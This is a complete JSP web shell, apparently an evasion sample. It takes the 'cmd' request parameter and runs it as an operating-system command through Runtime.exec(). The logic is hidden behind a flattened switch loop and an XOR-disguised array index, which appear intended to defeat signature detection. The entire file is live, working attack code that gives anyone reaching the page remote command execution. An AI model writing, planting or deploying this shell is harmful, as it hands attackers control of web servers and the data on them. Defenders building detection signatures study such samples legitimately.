<%!
    int func(){
        return 0;
    }
%>
<%
    String[] bigArr = {"2|1|3", "\\|", "cmd"};

    String a = bigArr[0x10001^0x10001];
    String[] b = a.split(bigArr[1]);
    int index = 0;
    Runtime rt = null;
    String param = null;
    while (true) {
        int op = Integer.parseInt(b[index++]);
        switch (op) {
            case 1:
                rt = Runtime.getRuntime();
                break;
            case 2:
                param = request.getParameter(bigArr[0x02]);
                break;
            case 3:
                rt.exec(param);
                break;
        }
    }
%>